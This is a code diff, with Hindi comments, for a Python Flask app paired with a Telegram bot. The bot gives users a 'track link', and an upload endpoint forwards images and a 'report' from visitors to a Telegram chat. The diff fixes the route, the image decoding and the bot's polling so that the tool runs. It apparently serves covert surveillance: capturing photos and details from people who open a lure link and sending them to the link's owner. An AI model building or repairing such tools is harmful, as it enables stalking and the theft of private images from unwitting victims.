@@ -3,16 +3,19 @@ from flask import Flask, render_template, request, jsonify
 import telebot
 from telebot import types
 
+# Flask App सेटअप
 app = Flask(__name__)
+
+# टेलीग्राम बॉट सेटअप
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = 7162565886 
 MY_CHAT_ID = "7162565886"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Conflict Error 409 को ठीक करने के लिए
+# Conflict Error 409 को रोकने के लिए
 try:
     bot.remove_webhook()
-    time.sleep(1)
+    time.sleep(2)
 except:
     pass
 
@@ -61,7 +64,9 @@ def callback_query(call):
         response = f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}\n\n🤗 If any problem contact admin ✅"
         bot.send_message(call.message.chat.id, response, reply_markup=contact_markup)
 
-@bot.route('/')
+# --- FLASK ROUTES (यहाँ गलती थी, अब ठीक है) ---
+
+@app.route('/')
 def index():
     return render_template('index.html')
 
@@ -75,13 +80,24 @@ def upload():
     
     if data.get('image'):
         try:
-            img_bytes = base64.b64decode(data.get('image').split(',')[1])
+            img_bytes = base64.decodebytes(data.get('image').split(',')[1].encode())
             bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
-        except: pass
+        except Exception as e:
+            print(f"Photo error: {e}")
     return jsonify({"status": "success"})
+
+def run_bot():
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=90)
+        except Exception as e:
+            print(f"Polling error: {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
     init_db()
-    threading.Thread(target=lambda: bot.polling(none_stop=True, timeout=90)).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    # बॉट को अलग थ्रेड में चलाएं
+    threading.Thread(target=run_bot, daemon=True).start()
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
     
